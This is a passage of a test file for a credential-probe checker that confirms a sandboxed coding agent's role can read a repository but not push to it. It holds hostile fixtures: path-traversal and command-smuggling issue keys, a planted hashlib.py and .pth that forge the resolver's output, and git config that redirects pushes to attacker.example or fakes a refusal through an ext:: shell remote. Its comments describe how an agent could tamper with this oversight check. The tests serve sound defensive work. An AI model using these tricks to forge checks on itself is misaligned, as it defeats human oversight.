    expect(stderr).toContain("CHECK pin: FAIL");
  });

  test("the same commit id spelled in capitals, named once or twice, is the pin: PASS", async () => {
    daemonServer = daemonStub();
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const sha = "ab12".repeat(10);
    const gh = pinGh("toolchain-pin.txt", `rev = "${sha.toUpperCase()}" # ${sha}\n`);
    const { status, stdout } = await run(["pin", "acme/gadgets", sha], env, { gh });
    expect(status).toBe(0);
    expect(stdout).toContain("CHECK pin: PASS");
  });

  // A default branch is whatever GitHub says: a `?` or `#` in it must not end or change the request.
  test("a default branch with a ? and a # is percent-encoded in the request, its slash kept", async () => {
    daemonServer = daemonStub();
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const sha = "b".repeat(40);
    const gh = pinGh("toolchain-pin.txt", `pin: ${sha}\n`, "release/v7?x#y", "release/v7%3Fx%23y");
    const { status, stdout } = await run(["pin", "acme/gadgets", sha], env, { gh });
    expect(status).toBe(0);
    expect(stdout).toContain("CHECK pin: PASS");
  });

  // Issue keys reach evidence file names and API paths, so a key shaped like anything else is a
  // usage error before any input is read.
  test("an issue key that is not PROJECT-123 is a usage error, for every observation that takes one", async () => {
    for (const args of [
      ["children", "../etc/passwd"],
      ["branch-base", "acme-1"],
      ["done", "ACME-1", "ACME-1/../x"],
      ["second-owner", "ACME-1?x", "the-pod"],
      ["cache", "ACME-", "the-pod"],
      ["negative", "no-repo", "ACME-1 ; id"],
      ["negative", "pr-in-x", "before", "../ACME-1"],
      ["negative", "repo-edit", "after", "somerun", "ACME-x"],
    ]) {
      const { status, stderr } = await run(args, {}, {});
      expect(status, args.join(" ")).toBe(2);
      expect(stderr, args.join(" ")).toContain("is not an issue key (PROJECT-123)");
    }
  });
});

describe("second-owner: real in-pod exec as the role, resolved once, with a positive push control", () => {
  const stateWithPR = (phase: string, extra: Record<string, unknown> = {}) =>
    makeStateBody({
      issues: {
        "ACME-2": {
          key: "ACME-2",
          generation: 1,
          phase,
          status: "todo",
          repo: "zeta/tools",
          pullRequest: { repo: "zeta/tools", number: 7 },
          ...extra,
        },
      },
    });
  const goodGh = `
case "$*" in
  "api repos/zeta/tools/pulls/7 --jq .merged") printf 'true' ;;
  *) echo "gh: unexpected call: $*" >&2; exit 1 ;;
esac`;

  function roleBin(): string {
    const work = join(dir, `run-${++runs}`);
    const bin = join(work, "role-bin");
    mkdirSync(bin, { recursive: true });
    return bin;
  }

  // fakeRoleGh answers `gh api repos/acme/widgets --jq .full_name` only: the read probe T.
  function fakeRoleGh(bin: string): void {
    fakeBin(
      bin,
      "gh",
      `
case "$*" in
  "api repos/acme/widgets --jq .full_name") printf 'acme/widgets' ;;
  *) echo "gh: unexpected call (role): $*" >&2; exit 1 ;;
esac`
    );
  }

  // fakeRoleGit answers the prober's git calls: `init` and `commit` in its probe repository, and
  // the dry-run push to O (the positive control, which always succeeds) and to T (parameterized
  // per test). With `record`, every call appends its arguments and its GIT_ variables to that file.
  function fakeRoleGit(bin: string, tBehavior: string, record?: string): void {
    const recording = record
      ? `{ printf 'ARGS %s\\n' "$*"; env | grep '^GIT_' | sort; } >>'${record}'`
      : ":";
    fakeBin(
      bin,
      "git",
      `
${recording}
case "$*" in
  "init -q "*) exit 0 ;;
  *" commit -q --allow-empty "*) exit 0 ;;
  *"push --no-verify --dry-run https://github.com/zeta/tools"*)
    exit 0
    ;;
  *"push --no-verify --dry-run https://github.com/acme/widgets"*)
    ${tBehavior}
    ;;
  *)
    echo "git: unexpected call (role): $*" >&2
    exit 1
    ;;
esac`
    );
  }

  function fixtureEnv(bin: string): Record<string, string> {
    return {
      PATH: `${bin}:/usr/bin:/bin`,
      HOME: "/tmp",
      POD_UID: "test-pod-uid",
      LEGION_GH_PATH: "/opt/legion/bin/gh",
      LEGION_GH_OWNERS_DIR: "/gh",
      GH_CONFIG_DIR: "/gh/zeta",
      LEGION_WORKSPACE: "/workspace",
    };
  }

  const podLabelKubectl = `
case "$*" in
  "get pod the-pod -o jsonpath={.metadata.labels.legion\\.dev/issue}")
    printf 'ACME-2'
    ;;
  *)
    ${realKubectl}
    ;;
esac`;

  // runSecondOwner runs second-owner with procRoot wired as MULTIREPO_PROC_ROOT, alongside the
  // test-seam marker as_role requires with it (MULTIREPO_PROC_ROOT alone is refused) — the
  // fake tree, never the host's real /proc.
  async function runSecondOwner(
    env: Record<string, string>,
    procRoot: string,
    fakes: { gh: string; kubectl: string },
    cwd?: string
  ) {
    return run(
      ["second-owner", "ACME-2", "the-pod"],
      { ...env, MULTIREPO_PROC_ROOT: procRoot, MULTIREPO_TEST_SEAM: "1" },
      fakes,
      cwd
    );
  }

  test("a pre-merge phase (awaiting_merge) is a FAIL even with a merged PR and valid credentials", async () => {
    daemonServer = daemonStub(stateWithPR("awaiting_merge"));
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const bin = roleBin();
    fakeRoleGh(bin);
    fakeRoleGit(
      bin,
      'echo "remote: Permission to acme/widgets.git denied. fatal: unable to access" >&2; exit 128'
    );
    const procRoot = fakeProcTree(fixtureEnv(bin));
    const { status, stderr } = await runSecondOwner(env, procRoot, {
      gh: goodGh,
      kubectl: podLabelKubectl,
    });
    expect(status).not.toBe(0);
    expect(stderr).toContain("CHECK second-owner: FAIL");
  });

  test("no process whose parent is worker-shim (the bare pod shell): FAIL", async () => {
    daemonServer = daemonStub(stateWithPR("production_check"));
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const procRoot = fakeProcTree(fixtureEnv(roleBin()), { shimPids: [] });
    const { status, stderr } = await runSecondOwner(env, procRoot, {
      gh: goodGh,
      kubectl: podLabelKubectl,
    });
    expect(status).not.toBe(0);
    expect(stderr).toContain(
      "second-owner: the credential probes in the-pod (implementer): failed"
    );
    expect(stderr).toContain(
      "expected exactly one worker-shim process whose own parent is PID 1, found 0"
    );
  });

  // Two processes both carrying the shim's own markers must refuse, naming
  // both shim candidates, never pick the lexically first one.
  test("two worker-shim processes: refused, naming both candidates", async () => {
    daemonServer = daemonStub(stateWithPR("production_check"));
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const procRoot = fakeProcTree(fixtureEnv(roleBin()), { shimPids: ["7", "20"] });
    const { status, stderr } = await runSecondOwner(env, procRoot, {
      gh: goodGh,
      kubectl: podLabelKubectl,
    });
    expect(status).not.toBe(0);
    expect(stderr).toContain(
      "expected exactly one worker-shim process whose own parent is PID 1, found 2"
    );
    expect(stderr).toContain("7");
    expect(stderr).toContain("20");
  });

  // A process whose cmdline carries worker-shim, but whose own parent is not PID 1 (e.g. the
  // host's own bash parenting it), is never the shim: the shim is identified by its parent being
  // PID 1, not by its cmdline alone.
  test("a worker-shim-cmdline process whose own parent is not PID 1 is never the shim: FAIL", async () => {
    daemonServer = daemonStub(stateWithPR("production_check"));
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const procRoot = fakeProcTree(fixtureEnv(roleBin()), { shimParent: "5" });
    const { status, stderr } = await runSecondOwner(env, procRoot, {
      gh: goodGh,
      kubectl: podLabelKubectl,
    });
    expect(status).not.toBe(0);
    expect(stderr).toContain(
      "expected exactly one worker-shim process whose own parent is PID 1, found 0"
    );
  });

  // A broker-enrolled pod's shim also parents an agent-secrets renew
  // process for its whole life, and a codegraph warm-up, so "exactly one child of worker-shim"
  // would refuse every such pod (two children: the agent and the renewer). Matching the shim's own
  // argv after its "--" picks the agent out from among them.
  test("a shim with an agent-secrets renew and a codegraph child still resolves its one agent: PASS", async () => {
    daemonServer = daemonStub(stateWithPR("production_check"));
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const bin = roleBin();
    fakeRoleGh(bin);
    fakeRoleGit(
      bin,
      `echo "remote: Permission to acme/widgets.git denied to zeta-tools-app. fatal: unable to access 'https://github.com/acme/widgets/': The requested URL returned error: 403" >&2; exit 128`
    );
    const procRoot = fakeProcTree(fixtureEnv(bin), { extraShimChildren: true });
    const { status, stdout } = await runSecondOwner(env, procRoot, {
      gh: goodGh,
      kubectl: podLabelKubectl,
    });
    expect(status).toBe(0);
    expect(stdout).toContain("CHECK second-owner: PASS");
  });

  // The install-wrapper case: a supported plugin-reinstall launch wraps
  // the shim's post-"--" argv in installArgv (internal/runtime/sandbox/plugins.go:120-131),
  // `/bin/sh -c <script> legion-plugins <agent argv>`, whose own final line `exec "$@"`
  // (installScript, plugins.go:108) replaces that process's image with the real agent — the
  // shim's own recorded argv never changes, but the agent's real /proc/<pid>/cmdline becomes just
  // `<agent argv>` again. This spawns a real process through exactly that shape (a real `sh -c
  // 'exec "$@"' legion-plugins sleep 999`, a real kernel exec, not two hand-written argv arrays
  // standing in for before and after) and copies its real post-exec /proc/<pid>/cmdline bytes
  // into the fake tree, so the match is checked against genuine kernel-produced argv.
  test("an install-wrapper exec transition: the agent's real post-exec argv still resolves: PASS", async () => {
    daemonServer = daemonStub(stateWithPR("production_check"));
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const bin = roleBin();
    fakeRoleGh(bin);
    fakeRoleGit(
      bin,
      `echo "remote: Permission to acme/widgets.git denied to zeta-tools-app. fatal: unable to access 'https://github.com/acme/widgets/': The requested URL returned error: 403" >&2; exit 128`
    );

    // A real process that starts as the wrapper's own child and execs into "sleep 999" — the
    // real-exec stand-in for the agent's own eventual argv, whichever it is.
    const realProc = Bun.spawn(["sh", "-c", 'exec "$@"', "legion-plugins", "sleep", "999"], {
      stdout: "ignore",
      stderr: "ignore",
    });
    let postExecCmdline: Buffer | undefined;
    // Real wait: the exec is a real kernel transition on a real pid, not an in-process timer —
    // deterministic fake-timer control cannot stand in for the kernel actually completing it.
    for (let i = 0; i < 500; i++) {
      try {
        const buf = await Bun.file(`/proc/${realProc.pid}/cmdline`).arrayBuffer();
        if (Buffer.from(buf).equals(Buffer.from("sleep\x00999\x00"))) {
          postExecCmdline = Buffer.from(buf);
          break;
        }
      } catch {
        /* the process may not be visible yet */
      }
      await Bun.sleep(20);
    }
    try {
      expect(postExecCmdline).toEqual(Buffer.from("sleep\x00999\x00"));

      const root = join(dir, `proc-${++runs}`);
      mkdirSync(root, { recursive: true });
      writeProcEntry(root, "1", { ppid: "0", cmdline: ["launcher"] });
      writeProcEntry(root, "7", {
        ppid: "1",
        cmdline: [
          "legion",
          "worker-shim",
          "--connect",
          "tcp://x:1",
          "--",
          "/bin/sh",
          "-c",
          'set -eu\n{ echo installing; } 1>&2\nexec "$@"\n',
          "legion-plugins",
          "sleep",
          "999",
        ],
        environ: fixtureEnv(bin),
      });
      const agentDir = join(root, "9");
      mkdirSync(agentDir, { recursive: true });
      writeFileSync(join(agentDir, "status"), "Name:\tproc9\nPPid:\t7\n");
      writeFileSync(join(agentDir, "cmdline"), postExecCmdline as Buffer);
      const pairs = Object.entries(fixtureEnv(bin)).map(([k, v]) => `${k}=${v}`);
      writeFileSync(join(agentDir, "environ"), `${pairs.join("\0")}\0`);
      writeProcEntry(root, "10", { ppid: "9", cmdline: ["bash", "-c", "sleep 1"] });
      writeProcEntry(root, "15", { ppid: "9", cmdline: ["zombie"], environ: {} });

      const { status, stdout } = await runSecondOwner(env, root, {
        gh: goodGh,
        kubectl: podLabelKubectl,
      });
      expect(status).toBe(0);
      expect(stdout).toContain("CHECK second-owner: PASS");
    } finally {
      realProc.kill();
    }
  });

  // Two children of the shim whose own argv both equal
  // its post-"--" argv (e.g. a stale incarnation briefly overlapping a fresh one) refuses by name,
  // never picking either arbitrarily.
  test("two children of worker-shim matching its own argv: refused, naming both", async () => {
    daemonServer = daemonStub(stateWithPR("production_check"));
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const procRoot = fakeProcTree(fixtureEnv(roleBin()), { duplicateAgent: true });
    const { status, stderr } = await runSecondOwner(env, procRoot, {
      gh: goodGh,
      kubectl: podLabelKubectl,
    });
    expect(status).not.toBe(0);
    expect(stderr).toContain(
      "expected exactly one child of worker-shim 7 matching its own argv (directly, or through the install wrapper's exec), found 2"
    );
    expect(stderr).toContain("9");
    expect(stderr).toContain("12");
  });

  test("production_check, merged, read succeeds, O's own push succeeds, but T's push also succeeds (no refusal): FAIL", async () => {
    daemonServer = daemonStub(stateWithPR("production_check"));
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const bin = roleBin();
    fakeRoleGh(bin);
    fakeRoleGit(bin, "exit 0"); // T's push succeeds too: never a refusal
    const procRoot = fakeProcTree(fixtureEnv(bin));
    const { status, stderr } = await runSecondOwner(env, procRoot, {
      gh: goodGh,
      kubectl: podLabelKubectl,
    });
    expect(status).not.toBe(0);
    expect(stderr).toContain("CHECK second-owner: FAIL");
  });

  // A push refused for a non-permission reason (bad ref, network,
  // not-a-repo, unanswered credential helper) is never counted as proof — only a 403 or an
  // explicit "Permission to <T>.git denied" is (neither pattern is ever
  // satisfied by kubectl's own wrapper noise, since each is anchored to git's own lines).
  for (const [name, tBehavior] of [
    [
      "network unreachable",
      'echo "fatal: unable to access https://github.com/acme/widgets/: Failed to connect" >&2; exit 128',
    ],
    ["bad ref", 'echo "error: src refspec HEAD does not match any" >&2; exit 1'],
    ["cwd not a git repository", 'echo "fatal: not a git repository" >&2; exit 128'],
    [
      "credential helper answers nothing",
      `echo "fatal: could not read Username for 'https://github.com': No such device or address" >&2; exit 128`,
    ],
    [
      "403 for the wrong repository (never anchored to T)",
      'echo "remote: Permission to other/outside.git denied. The requested URL returned error: 403" >&2; exit 128',
    ],
  ] as const) {
    test(`a dry-run push to T failing for a non-permission reason (${name}) is a FAIL, not a PASS`, async () => {
      daemonServer = daemonStub(stateWithPR("production_check"));
      dispatchServer = dispatchStub({});
      const env = fullInputs(
        `http://127.0.0.1:${daemonServer.port}`,
        `http://127.0.0.1:${dispatchServer.port}`
      );
      const bin = roleBin();
      fakeRoleGh(bin);
      fakeRoleGit(bin, tBehavior);
      const procRoot = fakeProcTree(fixtureEnv(bin));
      const { status, stderr } = await runSecondOwner(env, procRoot, {
        gh: goodGh,
        kubectl: podLabelKubectl,
      });
      expect(status).not.toBe(0);
      expect(stderr).toContain("CHECK second-owner: FAIL");
    });
  }

  test("GH_CONFIG_DIR not naming the issue's own owner directory is a FAIL", async () => {
    daemonServer = daemonStub(stateWithPR("production_check"));
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const bin = roleBin();
    fakeRoleGh(bin);
    fakeRoleGit(
      bin,
      'echo "remote: Permission to acme/widgets.git denied. fatal: unable to access" >&2; exit 128'
    );
    const procRoot = fakeProcTree({ ...fixtureEnv(bin), GH_CONFIG_DIR: "/gh/other-owner" });
    const { status, stderr } = await runSecondOwner(env, procRoot, {
      gh: goodGh,
      kubectl: podLabelKubectl,
    });
    expect(status).not.toBe(0);
    expect(stderr).toContain("CHECK second-owner: FAIL");
  });

  // cmdlineSha256 mirrors how writeProcEntry writes a /proc/<pid>/cmdline file (NUL-joined argv,
  // trailing NUL, UTF-8 bytes): the digest the observer computes over the whole file.
  function cmdlineSha256(argv: string[]): string {
    return createHash("sha256")
      .update(Buffer.from(`${argv.join("\0")}\0`, "utf8"))
      .digest("hex");
  }

  test("production_check, merged, role read succeeds, O's push succeeds, T's push refused 403: PASS, pid and cmdline recorded", async () => {
    daemonServer = daemonStub(stateWithPR("production_check"));
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const bin = roleBin();
    fakeRoleGh(bin);
    fakeRoleGit(
      bin,
      `echo "remote: Permission to acme/widgets.git denied to zeta-tools-app. fatal: unable to access 'https://github.com/acme/widgets/': The requested URL returned error: 403" >&2; exit 128`
    );
    const procRoot = fakeProcTree(fixtureEnv(bin));
    const { status, stdout, evidence } = await runSecondOwner(env, procRoot, {
      gh: goodGh,
      kubectl: podLabelKubectl,
    });
    expect(status).toBe(0);
    expect(stdout).toContain("CHECK second-owner: PASS");
    const written = readFileSync(join(evidence, "second-owner.txt"), "utf8");
    expect(written).toContain("403");
    // The proc root this run actually scanned is in the evidence, so a live run's reader can
    // see it was really /proc (or, in a test, the fake tree it was told to scan).
    expect(written).toContain(`proc root: ${procRoot}`);
    // The resolved pid (9, the agent — worker-shim's own child) and its cmdline digest are
    // recorded, never the cmdline's own values.
    expect(written).toContain("role pid: 9");
    expect(written).toContain(
      `role cmdline: argv0=omp argc=3 sha256=${cmdlineSha256(["omp", "--mode", "rpc"])}`
    );
  });

  // A pod agent's real cmdline carries
  // --append-system-prompt <the whole composed prompt, deployment instructions included>. The
  // evidence must never hold that text, nor any other argument's value, nor the environment
  // values the check compares — only the pid, argv[0], the argument count, and a sha256 of the
  // whole /proc/<pid>/cmdline file, computed by one Python parse that reads the file once and
  // cannot restart mid-argv (unlike an xargs-based redaction, which could
  // print a prompt verbatim once it pushed xargs past its own batching limit).
  test("the agent's cmdline never reaches evidence as values, only pid/argv0/argc/sha256: PASS", async () => {
    daemonServer = daemonStub(stateWithPR("production_check"));
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const bin = roleBin();
    fakeRoleGh(bin);
    fakeRoleGit(
      bin,
      `echo "remote: Permission to acme/widgets.git denied to zeta-tools-app. fatal: unable to access 'https://github.com/acme/widgets/': The requested URL returned error: 403" >&2; exit 128`
    );
    const marker = "DEPLOYMENT-INSTRUCTIONS-MARKER-do-not-leak-this-host.internal.example";
    const prompt = `# Role prompt\n\nAddressing fragment.\n\n${marker}\n`;
    const agentArgv = ["omp", "--mode", "rpc", "--append-system-prompt", prompt];
    const procRoot = fakeProcTree(fixtureEnv(bin), { agentArgv });
    const { status, stdout, evidence } = await runSecondOwner(env, procRoot, {
      gh: goodGh,
      kubectl: podLabelKubectl,
    });
    expect(status).toBe(0);
    expect(stdout).toContain("CHECK second-owner: PASS");
    const written = readFileSync(join(evidence, "second-owner.txt"), "utf8");
    expect(written).not.toContain(marker);
    expect(written).not.toContain(prompt);
    expect(written).not.toContain("--append-system-prompt");
    expect(written).toContain(`role cmdline: argv0=omp argc=5 sha256=${cmdlineSha256(agentArgv)}`);
  });

  // A prompt just under the runtime's 131,072-byte argument
  // bound (packages/daemon/internal/runtime/sandbox/manifest.go:53-55,248-257) is large enough
  // that a line-batching redactor (xargs) could invoke its command more than once, losing
  // the "the previous argument was --append-system-prompt" state across invocations and printing
  // the prompt as an ordinary argument. The Python parser reads the whole file once; a near-limit
  // prompt proves it never restarts.
  test("a ~130 KB prompt, near the runtime's own argument bound, is never in evidence: PASS", async () => {
    daemonServer = daemonStub(stateWithPR("production_check"));
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const bin = roleBin();
    fakeRoleGh(bin);
    fakeRoleGit(
      bin,
      `echo "remote: Permission to acme/widgets.git denied to zeta-tools-app. fatal: unable to access 'https://github.com/acme/widgets/': The requested URL returned error: 403" >&2; exit 128`
    );
    const marker = "DEPLOYMENT-INSTRUCTIONS-MARKER-must-not-leak";
    const prompt = marker + "-".repeat(130400 - marker.length);
    expect(prompt.length).toBe(130400);
    const agentArgv = ["omp", "--mode", "rpc", "--append-system-prompt", prompt];
    const procRoot = fakeProcTree(fixtureEnv(bin), { agentArgv });
    const { status, stdout, evidence } = await runSecondOwner(env, procRoot, {
      gh: goodGh,
      kubectl: podLabelKubectl,
    });
    expect(status).toBe(0);
    expect(stdout).toContain("CHECK second-owner: PASS");
    const written = readFileSync(join(evidence, "second-owner.txt"), "utf8");
    expect(written).not.toContain(marker);
    expect(written).not.toContain(prompt);
    expect(written).toContain(`role cmdline: argv0=omp argc=5 sha256=${cmdlineSha256(agentArgv)}`);
  });

  // Grep every evidence file this observation wrote (summary and raw alike) for the prompt,
  // deployment-instruction and environment markers — not only second-owner.txt, which the README
  // names, but anything a future change might also write.
  test("no evidence file carries the prompt marker, the instruction marker, or the live environment values", async () => {
    daemonServer = daemonStub(stateWithPR("production_check"));
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const bin = roleBin();
    fakeRoleGh(bin);
    fakeRoleGit(
      bin,
      `echo "remote: Permission to acme/widgets.git denied to zeta-tools-app. fatal: unable to access 'https://github.com/acme/widgets/': The requested URL returned error: 403" >&2; exit 128`
    );
    const promptMarker = "PROMPT-MARKER-xyz";
    const instructionMarker = "DEPLOYMENT-INSTRUCTIONS-MARKER-xyz";
    const resumeMarker = "/var/run/legion/sessions/resume-marker-xyz.json";
    const prompt = `${promptMarker}\n${instructionMarker}\n`;
    const agentArgv = [
      "omp",
      "--mode",
      "rpc",
      "--resume",
      resumeMarker,
      "--append-system-prompt",
      prompt,
    ];
    const ownersDirMarker = "/gh/owners-dir-marker-xyz";
    const procRoot = fakeProcTree(
      {
        ...fixtureEnv(bin),
        LEGION_GH_OWNERS_DIR: ownersDirMarker,
        GH_CONFIG_DIR: `${ownersDirMarker}/zeta`,
      },
      { agentArgv }
    );
    const { status, stdout, evidence } = await runSecondOwner(env, procRoot, {
      gh: goodGh,
      kubectl: podLabelKubectl,
    });
    expect(status).toBe(0);
    expect(stdout).toContain("CHECK second-owner: PASS");
    for (const name of readdirSync(evidence)) {
      const content = readFileSync(join(evidence, name), "utf8");
      expect(content).not.toContain(promptMarker);
      expect(content).not.toContain(instructionMarker);
      expect(content).not.toContain(resumeMarker);
      expect(content).not.toContain(ownersDirMarker);
    }
  });

  // as_role.py runs under `python3 -I -`. Without isolated mode, `python3 -` puts the current
  // directory and the user site directory on sys.path before the script's own imports run. The
  // exec's own cwd is the issue's workspace — the repository the agent edits — and its own HOME is
  // one the agent and the install wrapper both write to, so either one, a `hashlib.py` the module
  // import resolves from the cwd, or a `.pth` under the user site, can run arbitrary code before
  // the resolver does anything and forge the `@@@PID@@@` section this whole mechanism trusts. `-I`
  // (isolated mode) puts neither on sys.path and reads none of PYTHON*, so the real resolver's own
  // import of `hashlib` always reaches the standard library's, never a planted same-named module.
  test("a planted hashlib.py in the exec cwd and a .pth in the user site never forge the verdict", async () => {
    daemonServer = daemonStub(stateWithPR("production_check"));
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const bin = roleBin();
    fakeRoleGh(bin);
    fakeRoleGit(
      bin,
      `echo "remote: Permission to acme/widgets.git denied to zeta-tools-app. fatal: unable to access 'https://github.com/acme/widgets/': The requested URL returned error: 403" >&2; exit 128`
    );
    const procRoot = fakeProcTree(fixtureEnv(bin));

    // The attacker-planted module: if imported, it answers as_role's own protocol with a forged
    // pid (999, which the fake tree does not have) instead of letting the real resolver run.
    const forgedProtocol =
      'print("@@@PID@@@"); print("999"); print("@@@CMDLINE@@@"); print("argv0=forged argc=1 sha256=0"); import sys; sys.exit(0)';
    const workspace = mkdtempSync(join(tmpdir(), "multi-repo-acceptance-workspace-"));
    writeFileSync(join(workspace, "hashlib.py"), forgedProtocol);

    const fakeHome = mkdtempSync(join(tmpdir(), "multi-repo-acceptance-home-"));
    const siteProc = Bun.spawnSync([
      "python3",
      "-c",
      "import os,site; os.environ['HOME']=os.sys.argv[1]; import importlib; importlib.reload(site); print(site.getusersitepackages())",
      fakeHome,
    ]);
    const userSite = new TextDecoder().decode(siteProc.stdout).trim();
    mkdirSync(userSite, { recursive: true });
    writeFileSync(join(userSite, "user-site-attack.pth"), `${forgedProtocol}\n`);

    try {
      const { status, stdout, evidence } = await runSecondOwner(
        { ...env, HOME: fakeHome },
        procRoot,
        { gh: goodGh, kubectl: podLabelKubectl },
        workspace
      );
      expect(status).toBe(0);
      expect(stdout).toContain("CHECK second-owner: PASS");
      const written = readFileSync(join(evidence, "second-owner.txt"), "utf8");
      expect(written).toContain("role pid: 9");
      expect(written).not.toContain("role pid: 999");
      expect(written).not.toContain("argv0=forged");
    } finally {
      rmSync(workspace, { recursive: true, force: true });
      rmSync(fakeHome, { recursive: true, force: true });
    }
  });

  // The prober's pushes must not read anything the agent can write: the issue clone's .git/config,
  // ~/.gitconfig, $XDG_CONFIG_HOME/git/config, or the role's GIT_CONFIG_*/GIT_DIR/GIT_SSH_COMMAND
  // variables, any of which can carry a url.<x>.insteadOf, an `ext::` remote, a proxy or a
  // credential helper that turns the positive control and the refusal into whatever the agent likes.
  // So every git call runs in a repository the prober makes, with the system and global config off,
  // only the four variables below, https alone allowed, and the role's own credential helper named.
  test("the git probes see none of the role's GIT_ variables and no git config but their own", async () => {
    daemonServer = daemonStub(stateWithPR("production_check"));
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const record = join(dir, `git-record-${++runs}`);
    const bin = roleBin();
    fakeRoleGh(bin);
    fakeRoleGit(
      bin,
      `echo "remote: Permission to acme/widgets.git denied to zeta-tools-app." >&2; exit 128`,
      record
    );
    const procRoot = fakeProcTree({
      ...fixtureEnv(bin),
      GIT_CONFIG_COUNT: "1",
      GIT_CONFIG_KEY_0: "url.https://attacker.example/.insteadOf",
      GIT_CONFIG_VALUE_0: "https://github.com/",
      GIT_CONFIG_PARAMETERS: "'url.https://attacker.example/.insteadOf=https://github.com/'",
      GIT_DIR: "/workspace/.git",
      GIT_SSH_COMMAND: "attacker",
      GIT_ALLOW_PROTOCOL: "ext:https",
    });
    const { status, stdout } = await runSecondOwner(env, procRoot, {
      gh: goodGh,
      kubectl: podLabelKubectl,
    });
    expect(status).toBe(0);
    expect(stdout).toContain("CHECK second-owner: PASS");
    const calls = readFileSync(record, "utf8").split("ARGS ").slice(1);
    expect(calls.length).toBe(4); // init, commit, the push to O, the push to T
    for (const call of calls) {
      const variables = call.split("\n").slice(1).filter(Boolean).sort();
      expect(variables).toEqual([
        "GIT_ALLOW_PROTOCOL=https",
        "GIT_CONFIG_GLOBAL=/dev/null",
        "GIT_CONFIG_NOSYSTEM=1",
        "GIT_TERMINAL_PROMPT=0",
      ]);
    }
    const pushes = calls.filter((call) => call.includes(" push "));
    expect(pushes.length).toBe(2);
    for (const push of pushes) {
      expect(push).not.toContain("--git-dir");
      expect(push).toContain("-C /");
      expect(push).toContain("credential.helper=!legion git-credential");
      expect(push).toContain("credential.useHttpPath=true");
      expect(push).toContain("protocol.allow=never");
      expect(push).toContain("protocol.https.allow=always");
    }
  });

  // The same, against a real git and a ~/.gitconfig that forges both results: an `insteadOf` sends
  // the push to O to a local bare repository (so it succeeds), and an `ext::` pushInsteadOf makes
  // the push to T print git's own permission refusal. Without the isolation both are believed and
  // the check PASSes; with it neither is read, and the pushes reach only the (unreachable) proxy.
  test("a ~/.gitconfig that forges both pushes never makes second-owner PASS", async () => {
    daemonServer = daemonStub(stateWithPR("production_check"));
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const work = join(dir, `forge-${++runs}`);
    const home = join(work, "home");
    const bare = join(work, "bare.git");
    mkdirSync(home, { recursive: true });
    expect(Bun.spawnSync(["git", "init", "-q", "--bare", bare]).exitCode).toBe(0);
    writeFileSync(
      join(home, ".gitconfig"),
      [
        '[protocol "ext"]',
        "\tallow = always",
        '[url "ext::sh -c echo% remote:% Permission% to% acme/widgets.git% denied% to% bot.>&2;exit% 128 #"]',
        "\tpushInsteadOf = https://github.com/acme/widgets",
        `[url "${bare}"]`,
        "\tinsteadOf = https://github.com/zeta/tools",
        "",
      ].join("\n")
    );
    const bin = roleBin();
    fakeRoleGh(bin);
    const procRoot = fakeProcTree({
      ...fixtureEnv(bin),
      HOME: home,
      https_proxy: "http://127.0.0.1:1",
      HTTPS_PROXY: "http://127.0.0.1:1",
    });
    const { status, stderr, evidence } = await runSecondOwner(env, procRoot, {
      gh: goodGh,
      kubectl: podLabelKubectl,
    });
    expect(status).not.toBe(0);
    expect(stderr).toContain("CHECK second-owner: FAIL");
    const written = readFileSync(join(evidence, "second-owner.txt"), "utf8");
    expect(written).toContain("positive control: dry-run push to zeta/tools as role, exit 128");
    expect(written).not.toContain("denied to bot");
  });

  // MULTIREPO_PROC_ROOT set without the test suite's own marker is refused
  // outright, never silently accepted or silently defaulted to /proc.
  test("MULTIREPO_PROC_ROOT without MULTIREPO_TEST_SEAM=1 is refused", async () => {
    daemonServer = daemonStub(stateWithPR("production_check"));
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
